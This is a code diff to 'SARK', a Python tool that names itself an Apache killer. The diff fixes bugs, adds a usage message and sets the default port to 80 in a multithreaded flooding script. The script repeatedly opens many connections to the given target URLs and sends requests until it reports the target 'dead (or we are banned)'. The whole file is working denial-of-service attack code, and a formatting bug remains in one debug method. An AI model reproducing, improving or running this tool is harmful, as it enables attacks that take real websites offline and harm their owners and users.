@@ -67,8 +67,9 @@ class SARK:
 	def time():
 		return strftime("%d-%m-%Y ~ %H:%M:%S", localtime());
 
-	def __V(msg):
-		SARK.debug(msg);
+	def __V(self, msg):
+		if self.__verbose:
+			SARK.debug(msg);
 
 	def __init__(self):
 		SARK.header();
@@ -80,14 +81,12 @@ class SARK:
 				if arg[0:7] != "http://":
 					continue;
 				self.__urls.append(arg);
-			if len(self.__urls) == 0:
-				raise Exception("WTF?");
 			for option, value in opts:
 				if option in ("-h", "--help", "-u", "--usage"):
-					self.__printUsage();
-					sys.exit(0);
+					self.__usage();
+					sys.exit(3);
 				elif option in ("-v", "--verbose"):
-					sefl.__verbose = True;
+					self.__verbose = True;
 				elif option in ("-t", "--threads"):
 					self.__threads_num = int(value);
 					if self.__threads_num < 1:
@@ -98,6 +97,8 @@ class SARK:
 						raise Exception("WTF?");
 				else:
 					raise GetoptError();
+			if len(self.__urls) == 0:
+				raise Exception("WTF?");
 		except Exception as e:
 			print("[E] Bad options, run SARK with --help or --usage option to see all available possibilities.");
 			sys.exit(1);
@@ -109,8 +110,22 @@ class SARK:
 			self.__summary();
 			sys.exit(2);
 
+	def __usage(self):
+		print("\nUsage: ./sark.py [-t NUM] [-i SEC] [-v] TARGET-1-URL TARGET-2-URL (...)\n");
+		print(" -t NUM, --threads NUM");
+		print("     The number of threads that will be used to single attack");
+		print(" -i SEC, --interval SEC");
+		print("     Interval betwean targets");
+		print(" -v, --verbose");
+		print("     Enable verbose messages");
+		print(" -h, --help");
+		print("     Print this help message and exit");
+		print(" -u, --usage");
+		print("     Print this help message and exit");
+		print("");
+
 	def __kill(self):
-		stats = ("Socked created", "Connection established", "Data sent");
+		stats = ("Unable to connect", "Unable to send data", "Data sent");
 		SARK.info("Starting attack...");
 		sleep(1);
 		for url in self.__urls:
@@ -121,9 +136,9 @@ class SARK:
 				self.__status[url] = "Unknown";
 				while(True):
 					try:
-						SARK.info(" -> $%d" % num); 
+						SARK.info("Starting $%d" % num); 
 						self.__threads = [];
-						SARK.info("Creating threads...");
+						self.__V("Creating threads...");
 						fails = 0;
 						for id in range(0, self.__threads_num):
 							#TODO: Headers?
@@ -132,11 +147,11 @@ class SARK:
 							thread.start();
 						for thread in self.__threads:
 							thread.join();
-							SARK.debug("Thread #%d status: %s" % (thread.id(), stats[thread.status()]));
+							self.__V("Thread #%d status: %s" % (thread.id(), stats[thread.status()]));
 							if(thread.status() < 1):
 								fails += 1;
 							thread.close();
-						SARK.info(" -> $%d summary: %d/%d" % (num, self.__threads_num - fails, self.__threads_num));
+						SARK.info("$%d summary: %d/%d" % (num, self.__threads_num - fails, self.__threads_num));
 						if fails == self.__threads_num:
 							SARK.info(" -> $%d: Target is dead (or we are banned) after %d attack%s." % (num, num, "" if num == 1 else "s"));
 							self.__status[url] = "Dead (or we are banned)";
@@ -148,7 +163,7 @@ class SARK:
 						sleep(self.__interval);
 					except KeyboardInterrupt:
 						print("\n");
-						SARK.info("Action aborted.");
+						SARK.info("Action $%d (%s) aborted." % (num, url));
 						self.__status[url] = "Aborted (alive?)";
 						print();
 						raise KeyboardInterrupt;
@@ -174,13 +189,13 @@ class SARK:
 	class __Worker(Thread):
 		__url = None;
 		__addr = None;
-		__port = None;
+		__port = 80;
 		__id = -1;
 		__status = -1;
 		__socket = None;
 		__headers = ["Accept-Encoding: gzip", "User-Agent: SARK v0.1 - Scorpion Apache (Rank) Killer", "Connection: close"];
 
-		def __V(msg):
+		def __V(self, msg):
 			SARK.debug("Worker #%d: " % (self.__id, msg));
 		
 		def __init__(self, url, uid, headers = []):
@@ -189,7 +204,7 @@ class SARK:
 			self.__addr = self.__url.hostname;
 			self.__port = self.__url.port;
 			if not self.__port:
-				self.__port = 8888;
+				self.__port = 80;
 			self.__path = self.__url.path;
 			self.__id = uid;
 			self.__status = -1;
